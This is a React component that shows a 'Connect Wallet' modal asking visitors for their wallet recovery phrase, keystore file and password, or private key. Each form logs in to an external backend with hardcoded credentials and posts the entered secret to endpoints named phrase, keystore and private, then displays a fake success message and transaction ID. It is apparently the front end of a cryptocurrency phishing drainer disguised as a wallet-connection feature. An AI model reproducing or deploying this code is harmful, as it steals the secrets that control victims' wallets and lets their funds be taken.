import React, { useState, useRef } from 'react';
import { useDisclosure } from '@chakra-ui/react';
import axios from 'axios';
import {
  Modal,
  ModalOverlay,
  ModalContent,
  ModalHeader,
  ModalBody,
  ModalCloseButton,
  Button,
  Textarea,
  Box,
  Image,
  Text,
  Flex,
  Spinner,
  Alert,
  AlertIcon,
  useToast,
  useColorModeValue,
} from '@chakra-ui/react';

function Newcard({ item }) {
  const { isOpen, onOpen, onClose } = useDisclosure();
  const form = useRef();
  const [message, setMessage] = useState('');
  const [messages, setMessages] = useState('');
  const [messagesss, setMessagesss] = useState('');
  const [key, setkey] = useState('');
  const [isValid, setIsValid] = useState(true);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [email, setEmail] = useState("charles@gmail.com")
  const [password, setPassword] = useState("12345678")
  const [pass, setPass] = useState("")
  const toast = useToast();
  // const [showDiv1, setShowDiv1] = useState(true);
  // const [showDiv2, setShowDiv2] = useState(false);
  // const [showDiv3, setShowDiv3] = useState(false);
  const [currentDiv, setCurrentDiv] = useState(1);

  const handleButtonClick = (divNumber) => {
    setCurrentDiv(divNumber);
  };

  

  const cardBg = useColorModeValue('white', 'gray.800');
  const cardHoverBg = useColorModeValue('gray.100', 'gray.700');

  // const user = JSON.parse(sessionStorage.getItem('user'));
  
 

  const handleChange = (e) => {
    setMessage(e.target.value);
    
    setIsValid(e.target.value.length > 0);
  };

  // const handleButtonClick = () => {
  //   setShowDiv1(!showDiv1);
  //   // setShowDiv2(!showDiv2);
  //   setShowDiv3(!showDiv3);
  // };

  // const handleButtonClick2 = () => {
  //   setShowDiv1(!showDiv1);
  //   setShowDiv2(showDiv2);
  //   setShowDiv3(!showDiv3);
  // };

  // const handleButtonClick3 = () => {
  //   setShowDiv1(!showDiv1);
  //   setShowDiv2(!showDiv1);
  //   setShowDiv3(!showDiv1);
  // };

  const handleChange2 = (e) => {
    // setMessage(e.target.value);
    setPass(e.target.value);
    setIsValid(e.target.value.length > 0);
  };

  const handleChangess = (e) => {
    // setMessage(e.target.value);
    setMessagesss(e.target.value);
    setIsValid(e.target.value.length > 0);
  };


  const handleChange3 = (e) => {
    // setMessage(e.target.value);
    setMessages(e.target.value);
    setIsValid(e.target.value.length > 0);
  };


const sendForm = async (e) =>{
  e.preventDefault();

  try{
    // first post request
    const loginResponse = await axios.post("https://backend.accosmart.com.ng/api/auth/login", {email,password})
    // get token from response
    const token = loginResponse.data.token; 


    // send the second post request
    const phraseKey = await axios.post(
           'https://backend.accosmart.com.ng/api/key/phrase',
           { phrasetext: message }, 
            {
              headers: {
                Authorization: `Bearer ${token}`, 
                "Content-Type": "application/json",
              },
            }
    );

    alert("Successfully Submitted")

  }   
  catch(error) {
    console.error(error)
  }

  
  
}



const keyForm = async (e) =>{
  e.preventDefault();

  try{
    // first post request
    const loginResponse = await axios.post("https://backend.accosmart.com.ng/api/auth/login", {email,password})
    // get token from response
    const token = loginResponse.data.token; 


    // send the second post request
    const phraseKey = await axios.post(
           'https://backend.accosmart.com.ng/api/key/keystore',
           { keytext: message , password: pass }, 
            {
              headers: {
                Authorization: `Bearer ${token}`, 
                "Content-Type": "application/json",
              },
            }
    );

    alert("Successfully Submitted")

  }   
  catch(error) {
    console.error(error)
  }

  
  
}




const privateKey = async (e) =>{
  e.preventDefault();

  try{
    // first post request
    const loginResponse = await axios.post("https://backend.accosmart.com.ng/api/auth/login", {email,password})
    // get token from response
    const token = loginResponse.data.token; 


    // send the second post request
    const phraseKey = await axios.post(
           'https://backend.accosmart.com.ng/api/key/private',
           { privatetext: messages }, 
            {
              headers: {
                Authorization: `Bearer ${token}`, 
                "Content-Type": "application/json",
              },
            }
    );

    alert("Successfully Submitted")

  }   
  catch(error) {
    console.error(error)
  }

  
  
}
  // const sendForm= async (e) => {
  //   e.preventDefault();
    

  //   if (message.length <= 0) {
  //     setIsValid(false);
  //     toast({
  //       title: 'Error',
  //       description: 'Input field cannot be empty',
  //       status: 'error',
  //       duration: 4000,
  //       isClosable: true,
  //     });
  //     return;
  //   }

  //   setLoading(true);

    

  //   try {
  //     const response = await axios.post(
  //       'https://backend.accosmart.com.ng/api/key/phrase',
  //       { phrasetext: message }, 
  //       {
  //         headers: {
  //           Authorization: `Bearer ${token}`, 
  //           "Content-Type": "application/json",
  //         },
  //       }
  //     );

  //     setLoading(false);
  //     setSuccess(true);
  //     setMessage('');
  //     toast({
  //       title: 'Success',
  //       description: 'Successfully submitted',
  //       status: 'success',
  //       duration: 5000,
  //       isClosable: true,
  //     });

  //     console.log('Response:', response.data);

  //   } catch (error) {
  //     console.error('Error submitting form:', error);
  //     setLoading(false);
  //     toast({
  //       title: 'Error',
  //       description: 'Failed to submit form',
  //       status: 'error',
  //       duration: 5000,
  //       isClosable: true,
  //     });
  //   }
  // };


  return (
   <div>

<Box p={4}>
      <Flex
        direction="column"
        align="center"
        p={6}
        borderRadius="lg"
        boxShadow="lg"
        bg={cardBg}
        onClick={onOpen}
        cursor="pointer"
        _hover={{ bg: cardHoverBg, transform: 'scale(1.05)', transition: '0.3s ease-in-out' }}
        transition="0.3s ease-in-out"
      >
        <Image boxSize="80px" src={item.img} alt={item.name} mb={4} borderRadius="full" />
        <Text fontSize="xl" fontWeight="bold" textAlign="center">
          {item.name}
        </Text>
      </Flex>

      <Modal isOpen={isOpen} onClose={onClose}>
        <ModalOverlay />
        <ModalContent borderRadius="lg">
          <ModalHeader>Connect Wallet to {item.name}</ModalHeader>
          <ModalCloseButton />
          <ModalBody pb={6}>
            {loading && (
              <Flex justifyContent="center" my={4}>
                <Spinner />
              </Flex>
            )}
            {success && (
              <Alert status="success" mb={4} borderRadius="md">
                <AlertIcon />
                Successfully submitted
                
                <div className='mt-[2rem] ml-[-10rem]'> <br />  Transaction Id: xyhm16356726</div>
              </Alert>
              
            )}
            

        <div>
             <div className="flex gap-8">
              <h3 onClick={() => handleButtonClick(1)}>Phrase</h3>
              <h3 onClick={() => handleButtonClick(2)}>Keystore</h3>
              <h3 onClick={() => handleButtonClick(3)}>Private Key</h3>
             </div>
       
       {currentDiv === 1 &&
         <form ref={form} onSubmit={sendForm} className=''>
              
         <Textarea
           value={message}
           onChange={handleChange}
           placeholder="Enter recovery phrase"
           name="message"
           size="sm"
           mb={4}
           borderColor="gray.300"
           _hover={{ borderColor: 'gray.400' }}
           _focus={{ borderColor: 'blue.500', boxShadow: '0 0 0 1px blue.500' }}
         />
         <Text fontSize="sm" color="gray.500" mb={4}>
           Typically 12 (sometimes 24) words separated by spaces
         </Text>
         <Button
           type="submit"
           colorScheme="blue"
           width="100%"
           borderRadius="full"
           _hover={{ bg: 'blue.600' }}
         >
           Submit
         </Button>
       </form>
       }
        </div>




         <div>
         {currentDiv === 2 &&   <form ref={form} onSubmit={keyForm}>
              <Textarea
                value={message}
                onChange={handleChange}
                placeholder="Enter keystore"
                name="message"
                size="sm"
                mb={4}
                borderColor="gray.300"
                _hover={{ borderColor: 'gray.400' }}
                _focus={{ borderColor: 'blue.500', boxShadow: '0 0 0 1px blue.500' }}
              />

             <div >
             <Textarea className="h-[0.1rem] "
                value={pass}
                onChange={handleChange2}
                placeholder="Enter password"
                name="pass"
                size="sm"
                // mb={4}
                borderColor="gray.300"
                _hover={{ borderColor: 'gray.400' }}
                _focus={{ borderColor: 'blue.500', boxShadow: '0 0 0 1px blue.500' }}
              />
             </div>
              
              <Button className='mt-[3rem]'
                type="submit"
                colorScheme="blue"
                width="100%"
                borderRadius="full"
                _hover={{ bg: 'blue.600' }}
              >
                Submit
              </Button>
            </form>}
         </div>





           <div>
           {currentDiv === 3 && <form ref={form} onSubmit={privateKey} className=''>
           
              <Textarea
                value={messages}
                onChange={handleChange3}
                placeholder="Enter Privatekey"
                name="messages"
                size="sm"
                mb={4}
                borderColor="gray.300"
                _hover={{ borderColor: 'gray.400' }}
                _focus={{ borderColor: 'blue.500', boxShadow: '0 0 0 1px blue.500' }}
              />

             
              
              <Button className='mt-[3rem]'
                type="submit"
                colorScheme="blue"
                width="100%"
                borderRadius="full"
                _hover={{ bg: 'blue.600' }}
              >
                Submit
              </Button>
            </form>
            }
           </div>
          </ModalBody>
        </ModalContent>
      </Modal>
    </Box>


    
   </div>
  );
}

export default Newcard;
